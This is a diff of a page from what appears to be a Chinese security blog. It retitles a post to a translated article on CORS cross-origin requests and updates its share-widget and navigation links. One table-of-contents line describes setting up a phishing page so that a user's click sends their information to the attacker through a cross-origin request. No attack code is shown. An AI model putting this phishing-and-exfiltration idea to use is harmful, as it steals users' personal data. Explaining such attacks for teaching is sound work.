当我配置好钓鱼页面之后，一旦用户点击就会触发跨域请求，将用户信息发送给我</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#打赏译者"><span class="toc-number"></span> <span class="toc-text">打赏译者</span></a>
         
     </div>
     <style>
@@ -414,7 +392,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"The-Backdoor-Factory　| TimeS0ng's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"第九篇翻译：CORS跨域请求　| TimeS0ng's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -471,15 +449,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2017/10/27/HTTPS攻击/" title="上一篇: HTTPS攻击">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2017/10/08/Metasploit/" title="下一篇: Metasploit">
+            <a href="/2018/12/23/第八篇翻译：绕过XSS防护/" title="下一篇: 第八篇翻译：绕过XSS防护">
                 <i class="fa fa-angle-right"></i>
             </a>
         
